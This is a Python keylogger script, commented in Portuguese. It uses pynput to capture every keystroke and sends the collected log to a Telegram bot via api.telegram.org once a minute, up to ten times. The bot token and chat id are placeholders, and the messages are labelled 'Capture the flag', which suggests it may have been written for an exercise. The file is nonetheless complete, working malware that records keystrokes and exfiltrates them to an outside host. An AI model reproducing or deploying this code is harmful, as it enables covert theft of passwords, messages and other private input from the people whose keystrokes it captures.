from pynput import keyboard
import requests
from threading import Timer

log = ""

#variaveis do timer
contador = 0
limite_cont = 10

#Configurando automação do chat
token = "X"
chat_id = "X"

def enviar_telegram():
    global log, contador
    if log:
        mensagem = f'Capture the flag:\n\n{log}'
        url = f'https://api.telegram.org/bot{token}/sendMessage'

        payload = {'chat_id': chat_id, 'text': mensagem}

        try:
            resposta = requests.post(url, json=payload)
            if resposta.status_code == 200:
                print('Mensagem enviada com sucesso! (Envio {}/10)'.format(contador))
                log = ''
                contador += 1
            else:
                print('Erro ao enviar para o Telegram:', resposta.text)
        except Exception as e:
            print('Erro de conexão:', e)
    #Configurando o timer
    if contador < limite_cont:
        Timer(60, enviar_telegram).start()
    else:
        print("O programa atingiu o limite de 10 rotações")

#Configurando Logger

ignorar_tecla = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    global log
    try:
        if key.char is not None:
            log += key.char
    except AttributeError:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.tab:
                log += "\t"
            elif key == keyboard.Key.backspace:
                log += "-"
            elif key == keyboard.Key.esc:
                log += "[ESC]"
            elif key in ignorar_tecla:
                pass
            else:
                pass
with keyboard.Listener(on_press=on_press) as listerner:
    enviar_telegram()
    listerner.join()
    